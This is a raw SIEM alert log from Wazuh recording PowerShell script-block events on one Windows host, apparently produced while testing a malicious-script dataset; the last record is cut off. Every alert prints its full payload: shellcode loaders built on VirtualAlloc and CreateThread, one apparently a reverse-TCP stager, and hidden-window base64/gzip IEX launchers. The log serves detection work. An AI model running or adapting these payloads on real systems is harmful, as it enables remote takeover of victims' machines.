{"timestamp":"2026-07-06T02:18:53.765+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":70,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304333.2279244","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:13.6362750Z","eventRecordID":"144972","processID":"9204","threadID":"268","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x6a,0x1c,0xa6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: df8fb3d7-453e-4072-921b-895a8de365c6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1707.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x6a,0x1c,0xa6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"df8fb3d7-453e-4072-921b-895a8de365c6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1707.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:54.810+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":3,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304334.2290191","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:14.5062851Z","eventRecordID":"144976","processID":"264","threadID":"224","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\nif([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR2a759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/NRAgSyn2/3CYSxTFZ3zJKYlVT/lYmSyLI8eXtHXGl8lUpfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTXlm5ZueL2JiFq0qCt4zH1ZntDwpFYehzH2yQBWuycWkUvuxUUNzgE/QWQiQiU7UbrEHqAWoTkU3EWeJ0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyXGqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDezubHSoBWkfzXZuAt+qQx3QH/qhUSooFu2LJxQa6hWuREG2hzNM4zBcLpbBcWvgyKv16hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4jvAbxaUgamxCvqZtrS30uCMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYzBK4ix9qMz+zipxW5okTVQtu8XIRw+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm2BGvJKCwphmUyiRfNcsPrlrJUxSF8cyX26h/YvObFuTh7EUiQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2Lz/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyRvMRxASmdpsVMVDohX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUtRllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FUzrqoc00rq2l9G/Xo1u4jb/qov98a24eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUeN+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt54m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1DLQuH33pXGmB2B7g5fGxKnRWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEpDuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlqo6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/HwGDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTfvpdJvJ4AF8j/wA1xafydAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\r\n\r\nScriptBlock ID: 123cb632-a8c2-45d9-93c4-a76f09daa234\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1727.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR2a759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/NRAgSyn2/3CYSxTFZ3zJKYlVT/lYmSyLI8eXtHXGl8lUpfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTXlm5ZueL2JiFq0qCt4zH1ZntDwpFYehzH2yQBWuycWkUvuxUUNzgE/QWQiQiU7UbrEHqAWoTkU3EWeJ0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyXGqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDezubHSoBWkfzXZuAt+qQx3QH/qhUSooFu2LJxQa6hWuREG2hzNM4zBcLpbBcWvgyKv16hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4jvAbxaUgamxCvqZtrS30uCMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYzBK4ix9qMz+zipxW5okTVQtu8XIRw+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm2BGvJKCwphmUyiRfNcsPrlrJUxSF8cyX26h/YvObFuTh7EUiQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2Lz/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyRvMRxASmdpsVMVDohX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUtRllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FUzrqoc00rq2l9G/Xo1u4jb/qov98a24eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUeN+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt54m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1DLQuH33pXGmB2B7g5fGxKnRWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEpDuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlqo6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/HwGDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTfvpdJvJ4AF8j/wA1xafydAoAAA==''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);","scriptBlockId":"123cb632-a8c2-45d9-93c4-a76f09daa234","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1727.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:54.853+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":71,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304334.2301477","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:15.4946205Z","eventRecordID":"144983","processID":"7400","threadID":"8820","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: b276fcfe-6a3c-4d6d-8955-b2e9333f7967\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1730.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x35,0x51,0x14,0xba,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6,0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,0x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x99,0x44,0x72,0xff,0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0xb2,0x26,0x80,0xbd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0xbb,0x8c,0x16,0x86,0x7f,0xd8,0x46,0xb0,0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0c,0x90,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,0x59,0xc7,0x39,0x81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b,0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0xb6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3c,0x8e,0x21,0xc2,0x43,0x24,0x4f,0xea,0xd1,0xc3,0xc6,0xbd,0x4d,0xce,0x3f,0x89,0xd1,0x31,0x6a,0x82,0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x22,0xd6,0x94,0x22,0x16,0x85,0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45,0x16,0x36,0x5c,0xca,0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0xfc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"b276fcfe-6a3c-4d6d-8955-b2e9333f7967","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1730.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:18:56.480+0000","rule":{"level":10,"description":"Powershell script may be using Base64 decoding method","id":"91809","mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]},"firedtimes":4,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304336.2312786","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:19:16.8231731Z","eventRecordID":"144988","processID":"4212","threadID":"5900","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf4xE9CV1IeKrEX+6uLQN4GytfXr46GWOC1ohbILUaR2a759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/NRAgSyn2/3CYSxTFZ3zJKYlVT/lYmSyLI8eXtHXGl8lUpfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTXlm5ZueL2JiFq0qCt4zH1ZntDwpFYehzH2yQBWuycWkUvuxUUNzgE/QWQiQiU7UbrEHqAWoTkU3EWeJ0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyXGqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDezubHSoBWkfzXZuAt+qQx3QH/qhUSooFu2LJxQa6hWuREG2hzNM4zBcLpbBcWvgyKv16hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4jvAbxaUgamxCvqZtrS30uCMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYzBK4ix9qMz+zipxW5okTVQtu8XIRw+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm2BGvJKCwphmUyiRfNcsPrlrJUxSF8cyX26h/YvObFuTh7EUiQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2Lz/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyRvMRxASmdpsVMVDohX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUtRllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FUzrqoc00rq2l9G/Xo1u4jb/qov98a24eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUeN+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt54m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1DLQuH33pXGmB2B7g5fGxKn